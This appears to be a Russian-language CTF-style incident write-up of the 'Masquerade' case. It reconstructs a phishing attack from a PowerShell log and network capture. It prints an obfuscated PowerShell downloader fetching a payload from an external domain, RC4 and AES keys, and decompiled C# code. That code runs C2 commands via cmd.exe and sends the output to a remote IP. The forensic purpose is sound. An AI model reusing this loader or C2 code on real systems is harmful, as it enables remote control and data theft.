# Отчет по результатам расследования инцидента: Masquerade

## Введение

В ходе расследования инцидента был проведен анализ двух предоставленных артефактов: журнала событий Windows (`Powershell-Operational.evtx`) и дампа сетевого трафика (`traffic.pcapng`). Целью работы являлось восстановление цепочки атак, определение используемых методов шифрования, расшифровка команд злоумышленника и получение флага.

Задача формулировалась следующим образом: сотрудник финансового отдела Джим получил письмо, якобы от системного администратора, с просьбой запустить скрипт для "установки критических обновлений". После выполнения скрипта была замечена подозрительная сетевая активность. Предоставленные артефакты содержат реальное вредоносное ПО, однако анализ проводился исключительно статическими методами в контролируемой среде без запуска исполняемых файлов.

### Обнаружение вредоносного скрипта

В логе было найдено событие с идентификатором 4104 (PowerShell script block logging), содержащее код вредоносного скрипта:


### Определение внешнего домена

Из скрипта видно, что загрузка полезной нагрузки происходит с внешнего ресурса:

```powershell
$h = (New-Object System.Net.WebClient).DownloadString((-join('ht','tp','://','api-edg','e','cl','oud.xy','z/amd.bi','n')))
```

Строка собирается из фрагментов: `ht` + `tp` + `://` + `api-edg` + `e` + `cl` + `oud.xy` + `z/amd.bi` + `n`

**Ответ:** `api-edgecloud.xyz`

### Определение алгоритма шифрования

В скрипте используются следующие признаки алгоритма RC4:

1. Инициализация массива `0..255` — классическая подготовка S-блока для RC4 (KSA — Key Scheduling Algorithm)
2. Перемешивание S-блока с ключом
3. Генерация псевдослучайного байта и операция XOR с шифротекстом (PRGA — Pseudo-Random Generation Algorithm)

**Ответ:** RC4

### Определение ключа шифрования

Ключ формируется из строки:

```powershell
$k = [System.Text.Encoding]::UTF8.GetBytes(('X9vT3pL'+'2QwE'+'8xR6'+'ZkYhC4'+'s'))
```

**Ответ:** `X9vT3pL2QwE8xR6ZkYhC4s`

### Определение алгоритма и ключа шифрования клиента

В коде обнаружена функция создания ключа:

```csharp
private static string CreateAesKey()
{
    CreateAesManagedObject();
    SHA256Managed sHA256Managed = new SHA256Managed();
    byte[] bytes = Encoding.UTF8.GetBytes("M4squ3r4d3Th3P4ck3tSt34lthM0d31337");
    return Convert.ToBase64String(sHA256Managed.ComputeHash(bytes));
}
```

Ключ формируется как SHA-256 хэш от строки `M4squ3r4d3Th3P4ck3tSt34lthM0d31337`, а затем преобразуется в Base64.

**Алгоритм:** AES (CBC режим, PKCS7 паддинг)  
**Парольная фраза:** `M4squ3r4d3Th3P4ck3tSt34lthM0d31337`


## Этап 5: Изучение механизма выполнения команд

### Анализ кода получения команд

В декомпилированном коде обнаружена логика получения и выполнения команд:

```csharp
string[] array = (from x in new StreamReader(obj.GetResponse().GetResponseStream()).ReadToEnd().Split('\n')
    where x.Contains(string.Format("<!-- {0}", "oldcss="))
    select x).FirstOrDefault().Split(new string[1] { string.Format("<!-- {0}", "oldcss=") }, StringSplitOptions.None);
array = array[1].Split(new string[1] { " --></body>" }, StringSplitOptions.None);

string s = CreateAesKey();
string text = DecryptString(Convert.FromBase64String(s), array[0]);

Process process = new Process();
process.StartInfo.FileName = "cmd.exe";
process.StartInfo.Arguments = $"/Q /c {text} 2>&1";
process.StartInfo.UseShellExecute = false;
process.StartInfo.RedirectStandardOutput = true;
process.Start();
string text2 = process.StandardOutput.ReadToEnd();
process.WaitForExit();

text2 = computerName + "::::" + text2;
string s2 = EncryptString(Convert.FromBase64String(s), text2);
s2 = Convert.ToBase64String(Encoding.UTF8.GetBytes(s2));

HttpWebRequest obj2 = (HttpWebRequest)WebRequest.Create("http://34.174.57.99/images?guid=" + s2);
```

### Схема работы C2-коммуникации

1. Клиент загружает страницу с C2-сервера
2. Из HTML-комментария `<!-- oldcss=... -->` извлекается зашифрованная команда
3. Команда расшифровывается с помощью AES
4. Выполняется через `cmd.exe`
5. Результат выполнения шифруется тем же AES-ключом
6. Зашифрованный результат дважды кодируется в Base64
7. Отправляется на C2-сервер в параметре `guid`

## Выводы

В ходе расследования была полностью восстановлена цепочка атаки:

1. Злоумышленник отправил фишинговое письмо сотруднику Джиму
2. Джим запустил скрипт `updates.ps1`
3. Скрипт скачал с `api-edgecloud.xyz` зашифрованный файл `amd.bin`
4. Расшифровал его с помощью RC4 (ключ `X9vT3pL2QwE8xR6ZkYhC4s`) и сохранил как `amdfendrsr.exe`
5. Запустил полученный файл, который установил соединение с C2-сервером `34.174.57.99`
6. C2-сервер отправлял команды через HTML-комментарии (`oldcss=`), зашифрованные AES
7. Результаты выполнения команд шифровались и отправлялись обратно в параметре `guid`
8. В ходе выполнения команд злоумышленник получил информацию о системе и флаг

### Ключевые выводы по безопасности

1. **Фишинг остается эффективным вектором** — сотрудник запустил скрипт из подозрительного письма
2. **RC4 — устаревший алгоритм** — его использование позволяет легко расшифровать трафик при наличии ключа
3. **Многоступенчатые загрузчики** — вредоносное ПО может скачивать дополнительные компоненты с внешних ресурсов
4. **Маскировка трафика** — использование комментариев HTML для скрытой передачи команд затрудняет обнаружение
5. **Двойное Base64-кодирование** — усложняет автоматический анализ сетевого трафика
6. **Важность статического анализа** — позволяет полностью восстановить логику работы вредоносного ПО без его запуска
